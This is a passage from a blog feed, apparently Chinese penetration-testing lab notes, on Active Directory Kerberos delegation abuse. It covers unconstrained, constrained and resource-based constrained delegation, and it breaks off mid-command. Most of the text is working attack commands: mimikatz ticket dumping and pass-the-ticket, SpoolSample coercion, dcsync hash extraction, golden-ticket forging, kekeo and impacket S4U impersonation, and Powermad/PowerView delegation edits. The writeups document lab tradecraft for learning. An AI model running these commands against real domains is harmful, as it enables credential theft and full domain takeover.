service1以用户的名义来请求其它服务</span><br></pre></td></tr></table></figure><p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code></li></ul><p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p><p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派</p><p><img src="../images/image-20230930155737452.png" alt="image-20230930155737452"></p><p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p><p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p><p><img src="../images/image-20230930155754988.png" alt="image-20230930155754988"></p><p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930155920433.png" alt="image-20230930155920433"></p><p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p><p>此时我们访问域控是被拒绝的</p><p><img src="../images/image-20230930155938080.png" alt="image-20230930155938080"></p><p>然后通过ptt将TGT注入到当前会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问</p><p><img src="../images/image-20230930160007761.png" alt="image-20230930160007761"></p><p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p><p><img src="../images/image-20230930160032710.png" alt="image-20230930160032710"></p><p><strong>这里将域管理员的TGT票据注入到本机内存中后  那么我们就拥有了域管理员的权限了</strong></p><p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</span><br></pre></td></tr></table></figure><ul><li><code>-ComputerName</code>指定主机名</li><li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code></li></ul><p><img src="../images/image-20230930160204322.png" alt="image-20230930160204322"></p><p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。<strong>(这里的话是给被控主机开启这个WinRM服务)</strong></p><h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p><p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p><p>演讲PPT：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">地址</a></p><p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p><p><strong>(这里的话重点看利用原理就行了    简单易懂)</strong></p><p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p><p><img src="../images/image-20230930161150298.png" alt="image-20230930161150298"></p><p><strong>(用自己电脑搜索就行了  是可以看到是默认开启的)</strong></p><p>操作环境：</p><ul><li>域：<code>test.local</code></li><li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li><li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li></ul><p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p><p>我们给win10这个主机账户开启非约束委派</p><p><img src="../images/image-20230930161254235.png" alt="image-20230930161254235"></p><p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p><p><code>tifkin_</code>在他的github上开源了POC：<a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe dm2012 win10</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161332611.png" alt="image-20230930161332611"></p><p>然后使用mimikatz.exe导出域管理员的TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>可以发现成功导出来自<code>DM2012$</code>的TGT</p><p><img src="../images/image-20230930161430370.png" alt="image-20230930161430370"></p><p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:test.local /all /csv</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161514487.png" alt="image-20230930161514487"></p><p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</span><br></pre></td></tr></table></figure><p>成功以administrator的身份访问域控</p><p><img src="../images/image-20230930161630690.png" alt="image-20230930161630690"></p><p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>   <strong>这篇文章的话是总结了目前常用的基于约束委派的强制身份验证漏洞</strong></p><h2 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p><p><strong>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</strong></p><ul><li><code>S4U2self</code> (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</li><li><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</li></ul><p><strong>S4U2self</strong>：</p><p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p><p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p><p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p><p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p><p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p><p><strong>S4U2proxy</strong>:</p><p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p><p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p><p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p><p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p><p>(9) service2 响应步骤 8 的请求。</p><p>(10) service1 响应用户对步骤 5 中的请求。</p><p><strong>总结</strong></p><p>其实约束委派就是限制了<strong>S4U2proxy</strong> 这一部分  就是只能获取到用户访问服务的ST  不能获取到用户的TGT了</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li><li>域内主机：<code>DM08</code></li></ul><p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p><p><img src="../images/image-20230930170007987.png" alt="image-20230930170007987"></p><p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p><p><strong>简单点讲 </strong></p><blockquote><p>就是因为约束委派是不能使用<strong>S4U2proxy</strong>的   那么服务账户就只能获取到用户的ST  那么如果我们获取到了服务账户的密码或者ntlm的hash值  那么我们就可以进行ST的伪造 从而访问自己想要访问的服务</p></blockquote><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure><p><code>/user</code>: 服务用户的用户名</p><p><code>/password</code>: 服务用户的明文密码</p><p><code>/domain</code>: 所在域名</p><p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p><p><img src="../images/image-20230930171523675.png" alt="image-20230930171523675"></p><p>得到服务用户TGT：<code>TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi</code></p><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><strong>这里能伪造成功是因为这个服务账户的TGT是能访问这个cifs服务  然后我们使用他骗过了域管  然后成功伪造了ST</strong></p><p><strong>(能成功伪造这个域管用户Administrator成功的原因是因为这个KDC验证的话是只查找该用户是否存在   并不会判断其身份的可靠性)</strong></p><p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p><p>然后我们用mimikatz将ST2导入当前会话即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问到dm08的cifs服务</p><p><img src="../images/image-20230930172217655.png" alt="image-20230930172217655"></p><p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p><p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p><p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172252504.png" alt="image-20230930172252504"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172318778.png" alt="image-20230930172318778"></p><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173327785.png" alt="image-20230930173327785"></p><p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p><p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173522455.png" alt="image-20230930173522455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173538750.png" alt="image-20230930173538750"></p><h3 id="利用约束委派生成黄金票据"><a href="#利用约束委派生成黄金票据" class="headerlink" title="利用约束委派生成黄金票据"></a>利用约束委派生成黄金票据</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li></ul><p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p><p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p><p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p><p>我们可以使用powershell来添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser qiyou</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/qiyou.com&quot;) &#125;</span><br></pre></td></tr></table></figure><p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</span><br></pre></td></tr></table></figure><p><strong>(解释一下这里的这样干的原因  因为我们添加了服务账户  并且这个服务账户时约束这个krbtgt服务的   然后我们就有了访问这个服务的权限  并且因为这个服务是可以用来生成TGT的  所以我们就可以成功伪造 )</strong></p><p>-impersonate：表示伪造用户</p><p>-spn：表示我们要委派的服务的spn，这里是TGS</p><p>-dc-ip：域控ip</p><p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p><p><img src="../images/image-20230930174306259.png" alt="image-20230930174306259"></p><p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p><p><img src="../images/image-20230930174333936.png" alt="image-20230930174333936"></p><p>klist查看缓存的票据</p><p><img src="../images/image-20230930174346596.png" alt="image-20230930174346596"></p><p>访问域控</p><p><img src="../images/image-20230930174409252.png" alt="image-20230930174409252"></p><p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</span><br><span class="line"></span><br><span class="line">pth攻击其实也行  先dump出hash  然后再打</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7083788949482635271#heading-7&quot;&gt;参考文章1&lt;/a&gt;  &lt;a href=&quot;https://xz.aliyun.com/t/7217#toc-9&quot;&gt;参考文章—xz社区&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-基于资源的约束委派利用</title>
    <link href="https://ke1nys.github.io/posts/58c4c9ce.html"/>
    <id>https://ke1nys.github.io/posts/58c4c9ce.html</id>
    <published>2023-09-27T02:46:49.000Z</published>
    <updated>2023-10-20T01:50:25.825Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_44159028/article/details/124118253">参考文章1—CSDN</a></p><p><a href="https://xz.aliyun.com/t/7454">参考文章2—xz阿里云</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打春秋云镜<code>Certify</code>遇到的这个知识点   在这里记录一下  简称<code>RBCD</code></p><p><strong>(约束委派和非约束委派再新开一篇文章来写)</strong></p><p>这里的话因为懒得搭建环境  就直接用别人的截图了</p><h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><p>基于资源的约束性委派：为了使⽤户/资源更加独⽴，微软在Windows Server 2012中引⼊了基于资源的约束性委派。<strong>基于资源的约束委派不需要域管理员权限去设置相关属性，⽽是将设置委派的权限交给了服务机器。服务机器在自己账户上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，就可以进行基于资源的约束委派。</strong></p><p>配置了基于资源的约束委派的账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值为被允许基于资源约束性委派的账号的SID。<strong>如admin—pc的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为test的sid值(——这里就是说test这台计算机就对这个admin-pc这台计算机具有xxx权限   什么权限的话得看加域用户如何设置了——-)</strong>。2008 及以下的域控没有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性，只有 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器才有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击</strong></p><p>(GenericAll  GenericWrite  WriteProperty  WriteDacl)  具体来看就是这个权限  使用<code>bloodhound</code>的时候有的话应该能看到</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li><p>域：test.local</p></li><li><p>域控为：dm2012.test.local，Windows Server 2012R2</p></li><li><p>目标主机：dm2008.test.local，windows Server 2008R2</p></li><li><p>用户：qiyou，对dm2008.test.local主机具有写权限  </p><p><strong>(这个用户就是加域用户了)</strong>  <strong>在添加新的计算机到该域中的时候就需要该用户的身份验证</strong></p></li><li><p>其它域内主机：win10</p></li></ul><p>验证qiyou这个用户对dm2008是否具有写权限，可以使用<code>PowerView</code>枚举<code>DM2008.test.local</code>的中的特定ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module PowerView.ps1   //这个脚本github上就能找到</span><br><span class="line">Get-DomainUser -Identity qiyou -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity DM2008  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-662417213-3583657854-423750704-1001&quot;&#125;</span><br><span class="line"></span><br><span class="line">//就是获取这个 加域用户的sid  如何去配置了资源委派的机器上查看msDS-AllowedToActOnBehalfOfOtherIdentity 这个参数上的值是否是该加域用户的sid 时的话就是该机器基于qiyou的资源委派</span><br></pre></td></tr></table></figure><p><strong>(这里的话用上面参考的CSDN文章给的AdFind.exe工具来判断也是可以的)</strong></p><p>可以看到qiyou这个用户对dm2008这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p><p><img src="../images/image-20230927164119419.png" alt="image-20230927164119419"></p><p>我在本地拿之前配置好的环境试了一下也是差不多的</p><p><img src="../images/image-20230927164221926.png" alt="image-20230927164221926"></p><p>我们现在还需要的是一个具有SPN的账户，因为<code>S4U2Self</code>只适用于具有SPN的账户，恰好的是在域中有一个属性<code>MachineAccountQuota</code>，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN的，所以这里刚好符合我们的意图。</p><p><strong>(这里不用本机用户的原因就是因为不知道机器的密码  所以就自己添加一个新的计算机到域里  并自己配置账号密码)</strong></p><p>我们可以使用<code>Kevin Robertson</code>的<code>Powermad</code>中的<code>New-MachineAccount</code>来创建一个用户名为<code>evilsystem</code>，密码为<code>evil</code>的计算机账户</p><p><a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line">//再次说一下  做这些的话都要基于在加域用户的基础上</span><br></pre></td></tr></table></figure><p>可以看到成功创建一个计算机用户<code>evilsystem</code></p><p><img src="../images/image-20230927165549634.png" alt="image-20230927165549634"></p><p>下面是修改DM2008的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值，有两种方法可以修改，<code>Powerview</code>或者<code>ActiveDirectory</code>模块</p><p><strong>(就是修改该值为新加入的计算机的SID值)</strong></p><p>这里演示还是使用<code>PowerView.ps1</code> 这个工具</p><p>配置evilsystem到DM2008的基于资源约束的委派</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-662417213-3583657854-423750704-1115)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer DM2008| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br><span class="line"></span><br><span class="line">//sid值记得修改为新加入域的计算机的SID还是就是加入到哪台计算机也要写</span><br></pre></td></tr></table></figure><p>验证是否成功添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DM2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927170320114.png" alt="image-20230927170320114"></p><p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DM2008 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927170421613.png" alt="image-20230927170421613"></p><h2 id="生成票据攻击"><a href="#生成票据攻击" class="headerlink" title="生成票据攻击"></a>生成票据攻击</h2><p>使⽤ impacket的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py">getST.py</a> ⽣成票据（建议使⽤ socks5），会在当前⽬录下⽣administrator.ccache ⽂件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.10.2 test.lab/test\$:123456 -spn cifs/ADMIN--PC.test.lab -impersonate administrator</span><br></pre></td></tr></table></figure><p>这里解释一下这个cifs是个啥东西</p><p><img src="../images/image-20230927185849305.png" alt="image-20230927185849305"></p><p><img src="../images/image-20230927185911136.png" alt="image-20230927185911136"></p><p><img src="../images/864b8f14979f4217bf2d096044ea6c39-16958117211886.png" alt="img"></p><p>(这里用的时CSDN上的一张图  不过都差不多)</p><p>如何使用<code>mimikatz</code>注入内存就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptc administrator.ccache&quot;</span><br></pre></td></tr></table></figure><p>导入票据之后  可以使用psexec对计算机进行远程命令执行了</p><h2 id="解决敏感用户不可委派的问题"><a href="#解决敏感用户不可委派的问题" class="headerlink" title="解决敏感用户不可委派的问题"></a>解决敏感用户不可委派的问题</h2><p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p><p>下面我们把administrator设置成不可委派以及加入受保护组，如图</p><p><img src="../images/image-20230927195016925.png" alt="image-20230927195016925"></p><p>可以看到administrator是不可委派并且是受保护组的成员</p><p><img src="../images/image-20230927195034613.png" alt="image-20230927195034613"></p><p>这时候我们在通过s4u去申请一下票据，这个时候<code>S4U2self</code>是成功的，但是<code>S4U2proxy</code>是失败的、</p><p><img src="../images/image-20230927195119851.png" alt="image-20230927195119851"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe 